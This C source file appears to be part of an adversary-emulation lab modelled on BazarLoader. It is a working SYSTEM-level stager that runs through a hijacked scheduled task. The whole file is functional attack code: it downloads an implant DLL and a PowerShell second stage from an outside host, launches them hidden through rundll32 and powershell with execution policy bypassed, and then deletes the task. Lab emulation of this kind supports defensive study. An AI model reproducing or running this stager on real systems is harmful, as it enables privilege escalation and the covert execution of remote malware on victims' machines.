// c0015_stager.c — the SYSTEM half of the elevation path.
//
// The loader, running as the victim user, overwrites C:\ProgramData\C0015\updater.exe with this
// binary. A scheduled task that the environment already runs as SYSTEM starts it, so this code
// executes with the system token and can do what the user could not:
//
//   1. download the implant DLL, the service stub and the second stage script
//   2. write the stage configuration
//   3. install and start the private service host
//
// This models the step the source report does not show: BazarLoader reaches a service host and a
// high-integrity process from a user-level macro. The lab supplies the missing privilege through a
// misconfigured scheduled task instead of an exploit.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

#define STAGE_URL   "http://192.168.50.100/d8b3.dll"
#define STUB_URL    "http://192.168.50.100/c0015_stage.dll"
#define STAGE2_URL  "http://192.168.50.100/c0015_stage2.ps1"
#define STAGE_PATH  "C:\\Windows\\Temp\\c0015_d8b3.dll"
#define STUB_PATH   "C:\\Windows\\Temp\\c0015_stage.dll"
#define STAGE2_PATH "C:\\Windows\\Temp\\c0015_stage2.ps1"
#define CONFIG_DIR  "C:\\Users\\Public\\C0015"
#define CONFIG_PATH "C:\\Users\\Public\\C0015\\config.ini"
#define LOG_PATH    "C:\\ProgramData\\C0015\\stager.log"
#define SVC_NAME    "c0015svc"
#define SVC_GROUP   "c0015grp"

static void Log(const char *fmt, ...)
{
    FILE *f;
    va_list ap;
    f = fopen(LOG_PATH, "a");
    if (!f) return;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fputc('\n', f);
    fclose(f);
}

static BOOL Download(const char *url, const char *path)
{
    HINTERNET net, req;
    HANDLE out;
    BYTE buf[16384];
    DWORD got, written;
    BOOL ok = TRUE;

    net = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!net) return FALSE;
    req = InternetOpenUrlA(net, url, NULL, 0,
                           INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!req) { InternetCloseHandle(net); return FALSE; }

    out = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (out == INVALID_HANDLE_VALUE) { InternetCloseHandle(req); InternetCloseHandle(net); return FALSE; }

    for (;;) {
        if (!InternetReadFile(req, buf, sizeof(buf), &got)) { ok = FALSE; break; }
        if (got == 0) break;
        if (!WriteFile(out, buf, got, &written, NULL) || written != got) { ok = FALSE; break; }
    }
    CloseHandle(out);
    InternetCloseHandle(req);
    InternetCloseHandle(net);
    Log("download %s : %s", url, ok ? "ok" : "failed");
    return ok;
}

static BOOL WriteConfig(void)
{
    FILE *f;
    CreateDirectoryA(CONFIG_DIR, NULL);
    f = fopen(CONFIG_PATH, "w");
    if (!f) return FALSE;
    fprintf(f, "[stage]\n");
    fprintf(f, "spawn_cmd=C:\\Windows\\System32\\rundll32.exe %s,DllRegisterServer\n", STAGE_PATH);
    fprintf(f, "stage2=%s\n", STAGE2_PATH);
    fclose(f);
    return TRUE;
}

static BOOL RunStage(void)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd[512];
    char ps[512];

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    snprintf(cmd, sizeof(cmd),
             "C:\\Windows\\System32\\rundll32.exe %s,DllRegisterServer", STAGE_PATH);
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        Log("CreateProcess failed %lu", GetLastError());
        return FALSE;
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    Log("implant started");

    Sleep(5000);
    snprintf(ps, sizeof(ps),
             "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile "
             "-ExecutionPolicy Bypass -WindowStyle Hidden -File %s", STAGE2_PATH);
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcessA(NULL, ps, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Log("second stage started");
    } else {
        Log("second stage failed %lu", GetLastError());
    }
    return TRUE;
}
int main(void)
{
    Log("=== stager start ===");
    Download(STAGE_URL, STAGE_PATH);
    Download(STUB_URL, STUB_PATH);
    Download(STAGE2_URL, STAGE2_PATH);
    WriteConfig();
    RunStage();
    /* the task is single use: remove it so the stager does not start again every minute */
    system("schtasks /delete /tn C0015Updater /f >nul 2>&1");
    Log("=== stager done ===");
    return 0;
}



